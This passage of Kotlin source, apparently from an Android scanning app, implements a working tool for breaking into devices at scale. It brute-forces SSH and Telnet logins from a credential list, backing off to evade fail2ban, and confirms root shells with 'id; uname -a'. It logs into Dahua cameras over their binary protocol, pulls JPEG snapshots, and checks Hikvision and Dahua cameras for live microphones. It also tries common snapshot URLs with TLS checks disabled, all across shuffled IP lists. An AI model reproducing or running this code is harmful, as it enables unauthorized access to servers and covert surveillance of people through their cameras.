                                hostname = lines.find { !it.contains("uid=") && !it.contains("Linux") && !it.contains("=") && it.isNotBlank() && it.length < 60 }?.trim() ?: ""
                                osInfo = lines.find { "linux" in it.lowercase() && "x86" in it.lowercase() || "arm" in it.lowercase() || "mips" in it.lowercase() }?.trim()?.take(60) ?: ""

                            } catch (_: Exception) {
                                // exec не работает — interactive shell fallback
                                try {
                                    val session2 = ssh.startSession()
                                    session2.allocateDefaultPTY()
                                    val shell = session2.startShell()
                                    shell.outputStream.write("id\n".toByteArray())
                                    shell.outputStream.flush()
                                    Thread.sleep(1500)
                                    val buf = ByteArray(4096)
                                    val avail = shell.inputStream.available()
                                    if (avail > 0) {
                                        val n = shell.inputStream.read(buf, 0, minOf(avail, buf.size))
                                        if (n > 0) {
                                            shellOutput = String(buf, 0, n, Charsets.UTF_8).trim()
                                            val lower = shellOutput.lowercase()
                                            hasRealShell = "uid=" in lower
                                                || "#" in shellOutput
                                                || "$ " in shellOutput
                                                || "busybox" in lower
                                                || "root@" in lower
                                        }
                                    }
                                    shell.close()
                                    session2.close()
                                } catch (_: Exception) {}
                            }

                            try { ssh.disconnect() } catch (_: Exception) {}

                            if (hasRealShell) {
                                val brand = if (isVPS) "VPS" else "SSH-TTY"
                                val shellInfo = shellOutput.lines().firstOrNull { "uid=" in it.lowercase() }?.trim()?.take(60)
                                    ?: shellOutput.lines().firstOrNull { it.isNotBlank() }?.trim()?.take(60) ?: ""
                                val modelStr = if (isVPS) {
                                    val h = if (hostname.isNotBlank()) hostname else ip
                                    "VPS $h"
                                } else {
                                    shellInfo
                                }
                                val info = sshBanner.take(30) + " | " + modelStr
                                return ScanResult(ip, 22, login, password, info.take(120), 0, null, brand = brand)
                            }
                            // Auth прошёл но shell нет — пропускаем
                            return null
                        }
                        // Неверный пароль — нормальная ситуация, сброс счётчика
                        consecutiveFails = 0
                        delayMs = 200L
                    } catch (_: Exception) {
                        // Auth exception — тоже нормально
                        consecutiveFails = 0
                    } finally {
                        try { ssh.disconnect() } catch (_: Exception) {}
                    }
                } catch (_: Exception) {
                    // Connection refused / timeout — возможно fail2ban
                    consecutiveFails++
                    delayMs = (delayMs * 2).coerceAtMost(3000L)
                }
            }
            // SSH открыт но ни один пароль не подошёл — нет доступа к TTY
            return null
        }

        // SSH не открыт — НЕ фоллбэк на telnet (telnet проверяется отдельно по порту 23)
        return null
    }

    private fun tryTelnet(ip: String, telnetPort: Int = 23): ScanResult? {
        // Проверяем что порт открыт
        try {
            Socket().use { probe ->
                probe.connect(InetSocketAddress(ip, telnetPort), TIMEOUT_CONNECT)
            }
        } catch (_: Exception) {
            return null
        }

        // Telnet открыт — пробуем пароли
        for ((login, password) in SSH_CREDENTIALS) {
            if (cancelled) return null
            try {
                val socket = Socket()
                socket.connect(InetSocketAddress(ip, telnetPort), TIMEOUT_CONNECT)
                socket.soTimeout = 5000
                val input = socket.getInputStream()
                val output = socket.getOutputStream()

                // Читаем приветствие / промпт логина
                val welcomeBuf = ByteArray(2048)
                val wn = try { input.read(welcomeBuf) } catch (_: Exception) { 0 }
                val welcomeStr = if (wn > 0) String(welcomeBuf, 0, wn, Charsets.UTF_8) else ""

                // Telnet IAC negotiation — отвечаем WONT/DONT на все запросы
                if (wn > 0) {
                    val iacResp = handleTelnetIAC(welcomeBuf, wn)
                    if (iacResp.isNotEmpty()) {
                        output.write(iacResp)
                        output.flush()
                    }
                }

                // Отправляем логин
                output.write("$login\r\n".toByteArray())
                output.flush()
                try { Thread.sleep(600) } catch (_: InterruptedException) { socket.close(); return null }

                // Читаем ответ (ожидаем запрос пароля)
                val loginBuf = ByteArray(2048)
                val ln = try { input.read(loginBuf) } catch (_: Exception) { 0 }

                // Отправляем пароль
                output.write("$password\r\n".toByteArray())
                output.flush()
                try { Thread.sleep(800) } catch (_: InterruptedException) { socket.close(); return null }

                // Читаем результат после пароля
                val passBuf = ByteArray(4096)
                val pn = try { input.read(passBuf) } catch (_: Exception) { 0 }
                val passResp = if (pn > 0) String(passBuf, 0, pn, Charsets.UTF_8) else ""
                val passLower = passResp.lowercase()

                // Проверяем ошибку входа
                val failIndicators = listOf("login incorrect", "login failed", "authentication fail",
                    "bad password", "access denied", "invalid password", "error", "wrong password",
                    "denied", "not allowed")
                val isFail = failIndicators.any { it in passLower }
                if (isFail) {
                    socket.close()
                    continue
                }

                // Проверяем промпт — первичная проверка что мы внутри
                val promptIndicators = listOf("#", "$ ", "> ", "busybox", "root@", "admin@",
                    "~ #", "/ #", "shell", "welcome to")
                val hasPrompt = promptIndicators.any { it in passResp || it in passLower }

                if (!hasPrompt) {
                    socket.close()
                    continue
                }

                // ═══ ВАЛИДАЦИЯ TTY + VPS DETECTION ═══
                output.write("id; uname -a; cat /sys/class/dmi/id/product_name 2>/dev/null; systemd-detect-virt 2>/dev/null\r\n".toByteArray())
                output.flush()
                try { Thread.sleep(1500) } catch (_: InterruptedException) { socket.close(); return null }

                val cmdBuf = ByteArray(8192)
                val cn = try { input.read(cmdBuf) } catch (_: Exception) { 0 }
                val cmdResp = if (cn > 0) String(cmdBuf, 0, cn, Charsets.UTF_8) else ""
                val cmdLower = cmdResp.lowercase()

                // Ищем uid= в ответе — железное подтверждение shell
                val hasRealTTY = "uid=" in cmdLower || "gid=" in cmdLower
                    || "linux" in cmdLower || "busybox" in cmdLower

                if (!hasRealTTY) {
                    socket.close()
                    continue
                }

                // VPS детект
                val vpsMarkers = listOf(
                    "kvm", "qemu", "vmware", "virtualbox", "xen",
                    "hyper-v", "openstack", "hetzner", "digitalocean",
                    "aws", "amazon", "google", "gce", "azure",
                    "linode", "vultr", "ovh", "contabo",
                    "lxc", "openvz", "virtuozzo", "docker",
                    "standard pc", "bochs", "bhyve"
                )
                val isVPS = vpsMarkers.any { it in cmdLower }
                    || ("x86_64" in cmdLower && ("ubuntu" in cmdLower || "debian" in cmdLower || "centos" in cmdLower))

                socket.close()

                // Формируем инфо
                val shellInfo = cmdResp.lines().firstOrNull { "uid=" in it.lowercase() }?.trim()?.take(80)
                    ?: cmdResp.lines().firstOrNull { it.isNotBlank() }?.trim()?.take(80)
                    ?: "TTY"
                val brand = if (isVPS) "VPS" else "Telnet-TTY"
                val model = when {
                    isVPS -> "VPS $ip"
                    "busybox" in passLower || "busybox" in cmdLower -> "BusyBox/Linux"
                    "dvr" in passLower -> "DVR TTY"
                    "nvr" in passLower -> "NVR TTY"
                    else -> shellInfo
                }
                return ScanResult(ip, telnetPort, login, password, model, 0, null, brand = brand)

            } catch (_: Exception) {
                continue
            }
        }
        return null
    }

    // Обработка Telnet IAC negotiation (WILL/DO → WONT/DONT)
    private fun handleTelnetIAC(data: ByteArray, len: Int): ByteArray {
        val resp = ByteArrayOutputStream()
        var i = 0
        while (i < len - 2) {
            if (data[i] == 0xFF.toByte()) {
                val cmd = data[i + 1].toInt() and 0xFF
                val opt = data[i + 2]
                when (cmd) {
                    251 /* WILL */ -> { resp.write(byteArrayOf(0xFF.toByte(), 0xFE.toByte() /* DONT */, opt)) }
                    252 /* WONT */ -> { resp.write(byteArrayOf(0xFF.toByte(), 0xFE.toByte() /* DONT */, opt)) }
                    253 /* DO */   -> { resp.write(byteArrayOf(0xFF.toByte(), 0xFC.toByte() /* WONT */, opt)) }
                    // 254 DONT: per RFC 854 §3 — no response needed when server says DONT
                }
                i += 3
            } else {
                i++
            }
        }
        return resp.toByteArray()
    }

    // ─── Проверка микрофона ───

    private fun checkMicHikvision(ip: String, port: Int, login: String, password: String): Boolean {
        val paths = listOf(
            "/ISAPI/System/Audio/channels",
            "/ISAPI/System/TwoWayAudio/channels"
        )
        val auth = Base64.encodeToString("$login:$password".toByteArray(), Base64.NO_WRAP)
        val scheme = if (port in HTTPS_PORTS) "https" else "http"
        for (path in paths) {
            try {
                val url = URL("$scheme://$ip:$port$path")
                val conn = url.openConnection() as HttpURLConnection
                if (conn is HttpsURLConnection) {
                    conn.sslSocketFactory = sslContext.socketFactory
                    conn.hostnameVerifier = HostnameVerifier { _, _ -> true }
                }
                conn.connectTimeout = 1500
                conn.readTimeout = 2000
                conn.requestMethod = "GET"
                conn.setRequestProperty("Authorization", "Basic $auth")
                conn.connect()
                if (conn.responseCode == 200) {
                    val body = conn.inputStream.bufferedReader().use { it.readText().take(4000) }
                    conn.disconnect()
                    if ("audioIn" in body.lowercase() || "microphonevolume" in body.lowercase() ||
                        "enabled>true" in body.lowercase() || "audioinput" in body.lowercase() ||
                        "AudioChannel" in body) {
                        return true
                    }
                }
                conn.disconnect()
            } catch (_: Exception) {}
        }
        return false
    }

    private fun checkMicDahuaHttp(ip: String, port: Int, login: String, password: String): Boolean {
        val paths = listOf(
            "/cgi-bin/configManager.cgi?action=getConfig&name=Encode",
            "/cgi-bin/configManager.cgi?action=getConfig&name=General"
        )
        val auth = Base64.encodeToString("$login:$password".toByteArray(), Base64.NO_WRAP)
        for (path in paths) {
            try {
                val url = URL("http://$ip:$port$path")
                val conn = url.openConnection() as HttpURLConnection
                conn.connectTimeout = 1500
                conn.readTimeout = 2000
                conn.requestMethod = "GET"
                conn.setRequestProperty("Authorization", "Basic $auth")
                conn.connect()
                if (conn.responseCode == 200) {
                    val body = conn.inputStream.bufferedReader().use { it.readText().take(8000) }
                    conn.disconnect()
                    if ("AudioEnable=true" in body || "Audio.Enable=true" in body ||
                        "audio_enable=1" in body || ".Audio=" in body) {
                        return true
                    }
                }
                conn.disconnect()
            } catch (_: Exception) {}
        }
        return false
    }

    private fun checkMicGeneric(ip: String, port: Int, login: String, password: String): Boolean {
        // Пробуем RTSP OPTIONS на 554 — если есть аудио трек
        try {
            val url = URL("http://$ip:$port/cgi-bin/configManager.cgi?action=getConfig&name=Encode")
            val conn = url.openConnection() as HttpURLConnection
            conn.connectTimeout = 1500
            conn.readTimeout = 2000
            val auth = Base64.encodeToString("$login:$password".toByteArray(), Base64.NO_WRAP)
            conn.setRequestProperty("Authorization", "Basic $auth")
            conn.connect()
            if (conn.responseCode == 200) {
                val body = conn.inputStream.bufferedReader().use { it.readText().take(8000) }
                conn.disconnect()
                if ("audio" in body.lowercase() && ("enable" in body.lowercase() || "true" in body.lowercase())) {
                    return true
                }
            }
            conn.disconnect()
        } catch (_: Exception) {}
        return false
    }

    // ─── Dahua binary protocol (37777) ───

    private fun tryCredentials(ip: String, port: Int): ScanResult? {
        try {
            Socket().use { probe ->
                probe.connect(InetSocketAddress(ip, port), TIMEOUT_CONNECT)
            }
        } catch (_: Exception) {
            return null
        }

        for ((login, password) in CREDENTIALS) {
            if (cancelled) return null
            var socket: Socket? = null
            try {
                socket = Socket()
                socket.tcpNoDelay = true
                socket.setSoLinger(true, 0)
                socket.connect(InetSocketAddress(ip, port), TIMEOUT_CONNECT)
                socket.soTimeout = TIMEOUT_READ

                val output = socket.getOutputStream()
                val input = socket.getInputStream()
                val authStatus = sendLogin(output, input, login, password)

                if (authStatus == AuthStatus.BLOCKED) {
                    socket.close()
                    return ScanResult(ip, port, login, password, "", 0, null, blocked = true, brand = "Dahua")
                }

                if (authStatus != AuthStatus.SUCCESS) {
                    socket.close()
                    continue
                }

                val model = try { getModel(output, input) } catch (_: Exception) { "unknown" }
                val channels = try { getChannelsCount(output, input) } catch (_: Exception) { 1 }

                for (ch in 0 until minOf(channels, 4)) {
                    try {
                        socket.soTimeout = TIMEOUT_SNAPSHOT
                        val photo = getSnapshot(output, input, ch)
                        socket.soTimeout = TIMEOUT_READ
                        if (photo != null && photo.size > 100) {
                            try { socket.close() } catch (_: Exception) {}
                            // Dahua HTTP обычно на 80; если сканировали 37777 — пробуем 80 и сам port
                            val httpPort = if (port == DEFAULT_PORT) 80 else port
                            val mic = checkMicDahuaHttp(ip, httpPort, login, password)
                            return ScanResult(ip, port, login, password, model, channels, photo, brand = "Dahua", hasMic = mic)
                        }
                    } catch (_: Exception) {}
                }

                try { socket.close() } catch (_: Exception) {}
                val httpPort = if (port == DEFAULT_PORT) 80 else port
                val mic = checkMicDahuaHttp(ip, httpPort, login, password)
                return ScanResult(ip, port, login, password, model, channels, null, brand = "Dahua", hasMic = mic)

            } catch (_: Exception) {
                try { socket?.close() } catch (_: Exception) {}
                if (login == CREDENTIALS.first().first && password == CREDENTIALS.first().second) return null
                continue
            }
        }
        return null
    }

    private enum class AuthStatus { SUCCESS, BLOCKED, FAIL }

    private fun sendLogin(output: OutputStream, input: InputStream, login: String, password: String): AuthStatus {
        val loginAscii = login.toByteArray(Charsets.US_ASCII)
        val passAscii = password.toByteArray(Charsets.US_ASCII)
        val loginPadded = ByteArray(8)
        loginAscii.copyInto(loginPadded, 0, 0, minOf(loginAscii.size, 8))
        val passPadded = ByteArray(8)
        passAscii.copyInto(passPadded, 0, 0, minOf(passAscii.size, 8))
        val totalLen = 24 + loginAscii.size + passAscii.size
        if (totalLen > 127) return AuthStatus.FAIL
        val timestamp = (System.currentTimeMillis() / 1000).toString().toByteArray(Charsets.US_ASCII)

        val packet = ByteArrayOutputStream(64)
        packet.write(byteArrayOf(0xa0.toByte(), 0x00, 0x00, 0x60))
        packet.write(byteArrayOf(totalLen.toByte()))
        packet.write(byteArrayOf(0x00, 0x00, 0x00))
        packet.write(loginPadded)
        packet.write(passPadded)
        packet.write(byteArrayOf(0x04, 0x01, 0x00, 0x00, 0x00, 0x00, 0xa1.toByte(), 0xaa.toByte()))
        packet.write(loginAscii)
        packet.write("&&".toByteArray(Charsets.US_ASCII))
        packet.write(passAscii)
        packet.write(byteArrayOf(0x00))
        packet.write("Random:".toByteArray(Charsets.US_ASCII))
        packet.write(timestamp)
        packet.write("\r\n\r\n".toByteArray(Charsets.US_ASCII))

        output.write(packet.toByteArray())
        output.flush()

        val response = ByteArray(128)
        var totalRead = 0
        val deadline = System.currentTimeMillis() + TIMEOUT_READ
        while (totalRead < 10 && System.currentTimeMillis() < deadline) {
            val r = input.read(response, totalRead, 128 - totalRead)
            if (r == -1) return AuthStatus.FAIL
            totalRead += r
        }
        if (totalRead < 10) return AuthStatus.FAIL

        if (response[8].toInt() == 0) return AuthStatus.SUCCESS
        if (response[8].toInt() == 1 && response[9].toInt() == 4) return AuthStatus.BLOCKED
        return AuthStatus.FAIL
    }

    private fun getModel(output: OutputStream, input: InputStream): String {
        val cmd = ByteArray(32)
        cmd[0] = 0xa4.toByte()
        cmd[8] = 0x0b
        output.write(cmd)
        output.flush()
        val data = receiveMsg(input)
        val zeroIdx = data.indexOf(0x00)
        return if (zeroIdx > 0) String(data, 0, zeroIdx, Charsets.US_ASCII)
        else if (data.isNotEmpty()) String(data, Charsets.US_ASCII).trim()
        else "unknown"
    }

    private fun getChannelsCount(output: OutputStream, input: InputStream): Int {
        val cmd = ByteArray(32)
        cmd[0] = 0xa8.toByte()
        cmd[8] = 0x01
        output.write(cmd)
        output.flush()
        val data = receiveMsg(input)
        val dataStr = String(data, Charsets.US_ASCII)
        return "&&".toRegex().findAll(dataStr).count() + 1
    }

    private fun receiveMsg(input: InputStream): ByteArray {
        val header = readExact(input, 32) ?: return ByteArray(0)
        val length = ((header[5].toInt() and 0xFF) shl 8) or (header[4].toInt() and 0xFF)
        if (length <= 0 || length > 65535) return ByteArray(0)
        return readExact(input, length) ?: ByteArray(0)
    }

    private fun getSnapshot(output: OutputStream, input: InputStream, channelId: Int): ByteArray? {
        val chByte = channelId.toByte()
        val cmd = byteArrayOf(
            0x11, 0x00, 0x00, 0x00, 0x28, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x00,
            chByte, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, chByte, 0x00, 0x00, 0x00,
            0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
        )
        output.write(cmd)
        output.flush()

        val buffer = ByteArrayOutputStream()
        val chunk = ByteArray(8192)
        val deadline = System.currentTimeMillis() + TIMEOUT_SNAPSHOT
        var firstChunk = true

        while (System.currentTimeMillis() < deadline) {
            try {
                val r = input.read(chunk)
                if (r == -1) break
                if (firstChunk) {
                    if (r > 32) buffer.write(chunk, 32, r - 32)
                    firstChunk = false
                } else {
                    buffer.write(chunk, 0, r)
                }
                val data = buffer.toByteArray()
                if (findMarker(data, 0xFF.toByte(), 0xD9.toByte()) != -1) break
            } catch (_: java.net.SocketTimeoutException) { break }
        }

        var data = buffer.toByteArray()
        data = cleanGarbage(data, channelId.toByte())
        val startIdx = findMarker(data, 0xFF.toByte(), 0xD8.toByte())
        val endIdx = findMarker(data, 0xFF.toByte(), 0xD9.toByte())
        if (startIdx != -1 && endIdx != -1 && startIdx < endIdx) {
            val jpeg = data.copyOfRange(startIdx, endIdx + 2)
            return if (jpeg.size > 100) jpeg else null
        }
        return null
    }

    private fun cleanGarbage(data: ByteArray, chByte: Byte): ByteArray {
        val garbage1 = byteArrayOf(0x0a, chByte, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x00)
        val garbage2 = byteArrayOf(0xbc.toByte(), 0x00, 0x00, 0x00, 0x00, 0x80.toByte(), 0x00, 0x00, chByte)
        var result = data
        var changed = true
        while (changed) {
            changed = false
            val pos = findPattern(result, garbage1)
            if (pos != -1) {
                result = removeRange(result, maxOf(0, pos - 24), pos + garbage1.size)
                changed = true
            }
        }
        changed = true
        while (changed) {
            changed = false
            val pos = findPattern(result, garbage2)
            if (pos != -1) {
                result = removeRange(result, pos, minOf(pos + 32, result.size))
                changed = true
            }
        }
        return result
    }

    private fun removeRange(data: ByteArray, from: Int, to: Int): ByteArray {
        val out = ByteArray(data.size - (to - from))
        data.copyInto(out, 0, 0, from)
        data.copyInto(out, from, to, data.size)
        return out
    }

    private fun findPattern(data: ByteArray, pattern: ByteArray): Int {
        for (i in 0..data.size - pattern.size) {
            var match = true
            for (j in pattern.indices) {
                if (data[i + j] != pattern[j]) { match = false; break }
            }
            if (match) return i
        }
        return -1
    }

    private fun findMarker(data: ByteArray, b1: Byte, b2: Byte): Int {
        for (i in 0 until data.size - 1) {
            if (data[i] == b1 && data[i + 1] == b2) return i
        }
        return -1
    }

    private fun readExact(input: InputStream, size: Int): ByteArray? {
        val buf = ByteArray(size)
        var off = 0
        while (off < size) {
            val r = input.read(buf, off, size - off)
            if (r == -1) return if (off > 0) buf.copyOf(off) else null
            off += r
        }
        return buf
    }

    private fun extractXmlField(xml: String, tag: String): String? {
        val startTag = "<$tag>"
        val endTag = "</$tag>"
        val startIdx = xml.indexOf(startTag)
        if (startIdx == -1) return null
        val valueStart = startIdx + startTag.length
        val endIdx = xml.indexOf(endTag, valueStart)
        if (endIdx == -1) return null
        return xml.substring(valueStart, endIdx).trim()
    }

    // ─── Сканирование через плагин ───

    suspend fun scanWithPlugin(
        plugin: ScanPlugin,
        ips: List<String>,
        onResult: suspend (ScanResult) -> Unit,
        onProgress: suspend (ScanProgress) -> Unit,
        selectedPorts: List<Int>? = null
    ) {
        cancelled = false
        checkedCount.set(0)
        successCount.set(0)
        blockedCount.set(0)
        openPortsCount.set(0)
        val shuffled = ips.shuffled()
        val total = shuffled.size
        val startTime = System.currentTimeMillis()

        try {
            coroutineScope {
                val progressJob = launch(Dispatchers.Default) {
                    while (isActive && !cancelled && checkedCount.get() < total) {
                        delay(200)
                        val elapsed = System.currentTimeMillis() - startTime
                        val (eta, speed) = computeEta(checkedCount.get(), total, elapsed)
                        onProgress(ScanProgress(total, checkedCount.get(), successCount.get(), blockedCount.get(), elapsed, etaMs = eta, ipsPerSecond = speed, openPorts = openPortsCount.get()))
                    }
                }

                shuffled.map { ip ->
                    async(Dispatchers.IO) {
                        ensureActive()
                        if (cancelled) {
                            checkedCount.incrementAndGet()
                            return@async
                        }
                        semaphore.withPermit {
                            ensureActive()
                            if (cancelled) {
                                checkedCount.incrementAndGet()
                                return@withPermit
                            }
                            try {
                                val result = PluginManager.scanWithPlugin(plugin, ip, selectedPorts)
                                if (result != null) {
                                    if (result.blocked) blockedCount.incrementAndGet()
                                    else successCount.incrementAndGet()
                                    openPortsCount.incrementAndGet()
                                    onResult(result)
                                    // Немедленно обновить прогресс при находке
                                    // Используем checkedCount.get() — incrementAndGet() придёт чуть ниже
                                    val elapsed = System.currentTimeMillis() - startTime
                                    val checked = checkedCount.get()
                                    val (eta, speed) = computeEta(checked, total, elapsed)
                                    onProgress(ScanProgress(total, checked, successCount.get(), blockedCount.get(), elapsed, etaMs = eta, ipsPerSecond = speed, openPorts = openPortsCount.get()))
                                }
                            } catch (ce: CancellationException) {
                                throw ce  // Не глотать CancellationException
                            } catch (_: Exception) {}
                            checkedCount.incrementAndGet()
                        }
                    }
                }.awaitAll()

                progressJob.cancel()
            }
        } catch (_: CancellationException) {
            cancelled = true
        }
        val elapsed = System.currentTimeMillis() - startTime
        val (eta, speed) = computeEta(checkedCount.get(), total, elapsed)
        withContext(NonCancellable) {
            onProgress(ScanProgress(total, checkedCount.get(), successCount.get(), blockedCount.get(), elapsed,
                finished = !cancelled, cancelled = cancelled, etaMs = eta, ipsPerSecond = speed, openPorts = openPortsCount.get()))
        }
    }

}

/**
 * Утилита для получения JPEG снимков с камер.
 * Пробует HTTP snapshot-эндпоинты на разных портах.
 */
object SnapshotGrabber {
    private val snapshotPaths = listOf(
        "/cgi-bin/snapshot.cgi?channel=0",
        "/cgi-bin/snapshot.cgi",
        "/snap.jpg",
        "/snapshot.jpg",
        "/ISAPI/Streaming/channels/101/picture",
        "/onvif-http/snapshot?channel=1",
        "/image/jpeg.cgi",
        "/webcapture.jpg?command=snap&channel=1",
        "/tmpfs/snap.jpg",
        "/cgi-bin/viewer/video.jpg",
        "/Streaming/Channels/101/picture"
    )

    suspend fun tryGrabSnapshot(ip: String, login: String, password: String, knownPort: Int = 0): ByteArray? = withContext(Dispatchers.IO) {
        val httpPorts = if (knownPort in listOf(80, 8080, 8081, 8088, 8899, 443, 8443)) {
            listOf(knownPort) + listOf(80, 8080, 8081).filter { it != knownPort }
        } else {
            listOf(80, 8080, 8081, 8088, 8899)
        }

        val auth = Base64.encodeToString("$login:$password".toByteArray(), Base64.NO_WRAP)

        for (port in httpPorts) {
            try {
                Socket().use { probe -> probe.connect(InetSocketAddress(ip, port), 800) }
            } catch (_: Exception) { continue }

            for (path in snapshotPaths) {
                try {
                    val useHttps = port in setOf(443, 8443)
                    val proto = if (useHttps) "https" else "http"
                    val conn = URL("$proto://$ip:$port$path").openConnection() as HttpURLConnection

                    if (useHttps && conn is HttpsURLConnection) {
                        conn.sslSocketFactory = DahuaScanner.sslContext.socketFactory
                        conn.hostnameVerifier = HostnameVerifier { _, _ -> true }
                    }

                    conn.connectTimeout = 1500
                    conn.readTimeout = 2500
                    conn.requestMethod = "GET"
                    if (login.isNotEmpty()) {
                        conn.setRequestProperty("Authorization", "Basic $auth")
                    }
                    conn.connect()

                    if (conn.responseCode == 200) {
                        val contentType = conn.contentType ?: ""
                        if ("image" in contentType || "jpeg" in contentType || "jpg" in contentType || "octet" in contentType) {
                            val data = conn.inputStream.readBytes()
                            conn.disconnect()
                            if (data.size > 200) return@withContext data
                        }
                    }
                    conn.disconnect()
                } catch (_: Exception) {}
            }
        }
        null
    }
}
